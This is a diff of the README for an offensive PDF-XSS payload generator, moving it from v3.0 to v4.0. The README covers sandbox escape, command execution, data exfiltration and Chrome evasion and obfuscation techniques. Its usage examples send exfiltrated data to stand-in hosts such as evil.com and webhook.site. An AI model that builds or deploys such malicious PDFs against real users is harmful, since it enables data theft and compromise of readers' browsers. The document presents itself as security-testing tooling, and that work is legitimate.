@@ -1,22 +1,24 @@
-# PDF-XSS Tool v3.0 - Optimized Browser-Specific PDF Payload Generator
+# PDF-XSS Tool v4.0 - Consolidated Advanced PDF Payload Generator
 
 ## 🚀 PDF Browser Exploitation Framework
 
-A streamlined tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now optimized with browser-specific JSON databases and simplified interface.
+A consolidated and enhanced tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now featuring sophisticated Chrome evasion techniques and streamlined script architecture.
 
 ## 📁 Project Structure
 
 ```
 PDF-XSS/
-├── script.py                     # Main optimized PDF generator (v3.0)
-├── chrome.json                   # Chrome/PDFium specific payloads (15 payloads)
-├── firefox.json                  # Firefox/PDF.js specific payloads (15 payloads)
+├── pdf_xss_generator.py          # Main consolidated PDF generator (v4.0) - Primary tool
+├── payload_tester.py             # Simplified testing framework (v2.0)
+├── results_analyzer.py           # Simplified results analysis (v2.0)
+├── chrome.json                   # Chrome/PDFium specific payloads (77 payloads) - ENHANCED
+├── firefox.json                  # Firefox/PDF.js specific payloads (18 payloads)
 ├── safari.json                   # Safari/PDFKit specific payloads (12 payloads)
 ├── adobe.json                    # Adobe Reader specific payloads (15 payloads)
 ├── edge.json                     # Microsoft Edge specific payloads (12 payloads)
-├── payload_database_backup.json  # Backup of previous payload database
 ├── requirements.txt              # Python dependencies (none required)
 ├── IMPROVEMENTS.md               # Feature improvements documentation
+├── legacy_scripts/               # Legacy scripts (deprecated, kept for reference)
 ├── Files/                        # Generated PDF output directory
 └── README.md                     # This file
 ```
@@ -28,8 +30,8 @@ This tool is designed for legitimate security testing, educational purposes, and
 ## 🎯 PDF Browser Targeting
 
 ### Browser-Specific JSON Databases
-- **chrome.json**: Chrome/PDFium specific exploits (15 payloads) - DOM access, file system, command execution, sandbox escape
-- **firefox.json**: Firefox/PDF.js specific exploits (15 payloads) - CSP bypass, DOM manipulation, file system access
+- **chrome.json**: Chrome/PDFium specific exploits (77 payloads) - **ENHANCED with 20 advanced evasion techniques**
+- **firefox.json**: Firefox/PDF.js specific exploits (18 payloads) - CSP bypass, DOM manipulation, file system access
 - **safari.json**: Safari/PDFKit specific exploits (12 payloads) - WebKit integration, macOS-specific features
 - **adobe.json**: Adobe Reader/Acrobat specific exploits (15 payloads) - Full JavaScript API exploitation
 - **edge.json**: Microsoft Edge specific exploits (12 payloads) - Windows integration, WebView exploitation
@@ -39,10 +41,20 @@ This tool is designed for legitimate security testing, educational purposes, and
 - **file_system**: Local file system access and directory traversal
 - **command_execution**: System command execution and process spawning
 - **sandbox_escape**: PDF sandbox restriction bypasses
+- **advanced_evasion**: Modern Chrome evasion techniques (NEW - 20 sophisticated payloads)
 - **network_exfiltration**: Data exfiltration and covert channels
 - **csp_bypass**: Content Security Policy evasion techniques
 - **webkit_specific**: Safari WebKit specific exploits
 - **windows_integration**: Windows OS integration exploits
+
+### 🔥 NEW: Advanced Chrome Evasion Techniques
+- **V8 Engine Bypass**: Function constructor and reflection-based execution
+- **PDFium Sandbox Escape**: String.fromCharCode obfuscation and Array constructor abuse
+- **CSP Bypass**: setTimeout + indirect eval methods (eval, globalThis.eval)
+- **Modern Obfuscation**: Template literals, Proxy handlers, Reflect API
+- **Async Execution**: Promise chains, async generators, observer patterns
+- **Memory Manipulation**: WeakMap, Symbol registry, BigInt coercion
+- **API Abuse**: Intl.Collator, crypto.subtle, WebAssembly integration
 
 ## 🛠️ Installation & Requirements
 
@@ -56,73 +68,99 @@ This tool is designed for legitimate security testing, educational purposes, and
 cd PDF-XSS
 
 # List available browsers and payload counts
-python3 script.py --list-browsers
+python3 pdf_xss_generator.py --list-browsers
 
 # Generate Chrome PDF files
-python3 script.py -b chrome -u http://test.com
+python3 pdf_xss_generator.py -b chrome -u http://test.com
 ```
 
 ## 📖 Usage
+
+### Main Tools
+
+1. **pdf_xss_generator.py** - Primary PDF generation tool
+2. **payload_tester.py** - Test and validate payloads
+3. **results_analyzer.py** - Analyze test results
 
 ### Basic Commands
 
 ```bash
 # Show help and available options
-python3 script.py --help
+python3 pdf_xss_generator.py --help
 
 # List available browsers and payload counts
-python3 script.py --list-browsers
+python3 pdf_xss_generator.py --list-browsers
 
-# Generate Chrome PDF files with custom URL
-python3 script.py -b chrome -u http://test.com
+# Generate Chrome PDF files with custom URL (77 enhanced payloads)
+python3 pdf_xss_generator.py -b chrome -u http://test.com
 
 # Generate Firefox PDF files (limited to 5)
-python3 script.py -b firefox --count 5
+python3 pdf_xss_generator.py -b firefox --count 5
 
 # Generate all browsers
-python3 script.py -b all -u http://webhook.site/xyz
+python3 pdf_xss_generator.py -b all -u http://webhook.site/xyz
 ```
 
 ### Browser-Specific PDF Generation
 
 ```bash
 # Generate individual Chrome PDF files (one payload per file)
-python3 script.py -b chrome -u http://test.com
+python3 pdf_xss_generator.py -b chrome -u http://test.com
 
 # Generate single file with all Firefox payloads (one payload per page)
-python3 script.py -b firefox --single-file -u http://evil.com
+python3 pdf_xss_generator.py -b firefox --single-file -u http://evil.com
 
 # Generate Safari PDF files with custom PDF version
-python3 script.py -b safari --pdf-version 1.3 -u http://test.com
+python3 pdf_xss_generator.py -b safari --pdf-version 1.3 -u http://test.com
 
 # Generate Adobe Reader PDF files
-python3 script.py -b adobe -u http://webhook.site/xyz
+python3 pdf_xss_generator.py -b adobe -u http://webhook.site/xyz
 
 # Generate Microsoft Edge PDF files
-python3 script.py -b edge -u http://collaborator.com
+python3 pdf_xss_generator.py -b edge -u http://collaborator.com
+```
+
+### Testing and Analysis
+
+```bash
+# Test Chrome payloads and generate report
+python3 payload_tester.py -b chrome --report
+
+# Test all browsers
+python3 payload_tester.py -b all --report
+
+# Analyze latest test results
+python3 results_analyzer.py --categories --techniques --recommendations
+
+# Analyze specific report
+python3 results_analyzer.py -r test_report_20240730_123456.json
 ```
 
 ### Advanced Options
 
 ```bash
 # Limit number of payloads
-python3 script.py -b chrome --count 3 -u http://test.com
+python3 pdf_xss_generator.py -b chrome --count 3 -u http://test.com
 
 # Use older PDF version (weaker security)
-python3 script.py -b firefox --pdf-version 1.3 -u http://test.com
+python3 pdf_xss_generator.py -b firefox --pdf-version 1.3 -u http://test.com
 
 # Custom output directory
-python3 script.py -b safari -o CustomOutput -u http://test.com
+python3 pdf_xss_generator.py -b safari -o CustomOutput -u http://test.com
 
 # Single file mode (one payload per page)
-python3 script.py -b adobe --single-file -u http://test.com
+python3 pdf_xss_generator.py -b adobe --single-file -u http://test.com
+
+# Generate files for all advanced Chrome evasion techniques
+python3 pdf_xss_generator.py -b chrome -u http://webhook.site/xyz --count 20
 ```
 
 ## 🏁 Command Line Flags
 
+### PDF Generator (pdf_xss_generator.py)
 | Flag | Description | Example |
 |------|-------------|---------|
-| `-h, --help` | Show help message | `python3 script.py --help` |
+| `-h, --help` | Show help message | `python3 pdf_xss_generator.py --help` |
 | `-b, --browser` | Target browser (required) | `-b chrome` |
 | `-u, --url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
 | `-o, --output-dir` | Output directory | `-o Files` |
@@ -130,6 +168,20 @@ python3 script.py -b adobe --single-file -u http://test.com
 | `--count` | Limit number of payloads | `--count 5` |
 | `--pdf-version` | PDF version (1.0-2.0) | `--pdf-version 1.3` |
 | `--list-browsers` | List available browsers | `--list-browsers` |
+
+### Payload Tester (payload_tester.py)
+| Flag | Description | Example |
+|------|-------------|---------|
+| `-b, --browser` | Target browser to test | `-b chrome` |
+| `--report` | Generate detailed JSON report | `--report` |
+
+### Results Analyzer (results_analyzer.py)
+| Flag | Description | Example |
+|------|-------------|---------|
+| `-r, --report` | Specific report file to analyze | `-r test_report_xyz.json` |
+| `--categories` | Show category analysis | `--categories` |
+| `--techniques` | Show evasion technique analysis | `--techniques` |
+| `--recommendations` | Show improvement recommendations | `--recommendations` |
 
 ## 📁 Output Files
 
@@ -149,19 +201,21 @@ The tool creates two types of output:
 
 ## 🎯 Key Features
 
-### ✅ Optimizations in v3.0
-- **Browser-specific JSON databases**: Organized payloads by browser in separate JSON files
-- **Simplified command-line interface**: Reduced from 15+ flags to 7 essential flags
-- **One payload per page option**: `--single-file` creates separate PDF for each payload
-- **Complete payload visibility**: Full JavaScript payload shown in each PDF file
-- **OS-aware targeting**: Automatically adapts file paths based on operating system
-- **No browser validation removal**: Browser-specific files work without browser flag restrictions
+### ✅ Enhancements in v4.0
+- **Consolidated Script Architecture**: Reduced from 5 overlapping scripts to 3 focused tools
+- **Enhanced Chrome Targeting**: 77 payloads with 20 advanced evasion techniques (up from 57)
+- **Modern CVE Coverage**: Updated with 2024 CVEs (CVE-2024-0519, CVE-2023-4762, etc.)
+- **Advanced Evasion Techniques**: V8 engine bypass, Proxy handlers, async generators, WebAssembly
+- **Sophisticated Obfuscation**: Template literals, Symbol registry, BigInt coercion
+- **Testing Framework**: Built-in payload validation and effectiveness scoring
+- **Results Analysis**: Comprehensive reporting with improvement recommendations
 
-### 🗑️ Removed Complexity
-- **Merged and removed scripts**: Combined Another-Script.py and merge_json_payloads.py functionality
-- **Simplified payload obfuscation**: Removed complex obfuscation options
-- **Removed parallel processing**: Simplified execution model
-- **Reduced verbose output**: Cleaner, more focused output
+### 🗑️ Simplified Architecture
+- **Merged Scripts**: Combined script.py + Another-Script.py into pdf_xss_generator.py
+- **Integrated Utilities**: Payload merging functionality built into main generator
+- **Streamlined Testing**: Simplified test_framework.py → payload_tester.py
+- **Focused Analysis**: Simplified results_tracker.py → results_analyzer.py
+- **Legacy Preservation**: Old scripts moved to legacy_scripts/ for reference
 
 ## 🔍 PDF Security Testing Examples
 
